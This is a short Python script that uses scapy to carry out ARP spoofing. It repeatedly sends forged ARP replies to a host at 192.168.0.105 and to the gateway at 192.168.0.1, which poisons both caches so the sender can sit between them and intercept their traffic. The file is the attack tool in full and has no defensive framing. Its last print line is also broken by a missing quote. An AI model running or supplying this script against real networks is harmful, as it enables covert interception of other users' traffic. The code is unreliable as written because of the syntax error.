import scapy.all as sp
import sys
import time
#import Mac_address as ma


def arp(ip):
    arp_packet=sp.ARP(pdst=ip)
    brodcast=sp.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_and_brodcast=brodcast/arp_packet
    answer=sp.srp(arp_and_brodcast,verbose=False,timeout=1)[0]
    return answer[0][1].hwsrc

def spoof(target_ip,spoof_ip):
	target_mac=arp(target_ip)
	packet= sp.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
	sp.send(packet,verbose=False)



packs=0
try:
 while True:
 	spoof("192.168.0.105","192.168.0.1")
 	spoof("192.168.0.1","192.168.0.105")
 	packs=packs+2
 	print("\r[+]sent"+str(packs)),
 	sys.stdout.flush()
 	time.sleep(2)
except KeyboardInterrupt:  
 	print([-] Quiting")
